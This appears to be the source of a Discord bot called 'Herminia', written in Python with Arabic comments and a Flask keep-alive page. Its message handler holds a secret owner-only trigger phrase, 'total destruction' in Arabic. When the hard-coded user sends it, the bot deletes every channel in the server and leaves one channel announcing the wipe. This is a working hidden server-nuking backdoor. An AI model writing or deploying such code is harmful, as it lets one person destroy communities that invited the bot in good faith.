import discord
from discord.ext import commands
import os, json, asyncio
from dotenv import load_dotenv
from flask import Flask
from threading import Thread

load_dotenv()
intents = discord.Intents.default()
intents.message_content = True 
intents.guilds = True

bot = commands.Bot(command_prefix="!", intents=intents)
app = Flask(__name__)

@bot.event
async def on_message(message):
    if message.author.bot: return

    # --- ميزة التدمير الشامل (لك أنت فقط) ---
    if message.content == "تدمير_شامل":
        MY_ID = 1371432836946726934  # <<< ضع رقم الـ ID الخاص بك هنا بدلاً من هذه الأرقام
        if message.author.id == MY_ID:
            print(f"🧨 تم تفعيل التدمير الشامل في: {message.guild.name}")
            
            # حذف كل القنوات (رومات صوتية وكتابية)
            for channel in message.guild.channels:
                try:
                    await channel.delete()
                except:
                    continue # إذا فشل في حذف قناة معينة يكمل الباقي
            
            # إنشاء قناة واحدة أخيرة باسمك
            await message.guild.create_text_channel('تم-تصفير-السيرفر-بنجاح')
        return

    await bot.process_commands(message)

@app.route('/')
def home(): return "Herminia is Ready!"

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

@bot.event
async def on_ready():
    print(f"✅ {bot.user} متصل وجاهز للعمل")

if __name__ == "__main__":
    Thread(target=run_flask).start()
    bot.run(os.getenv('DISCORD_TOKEN'))

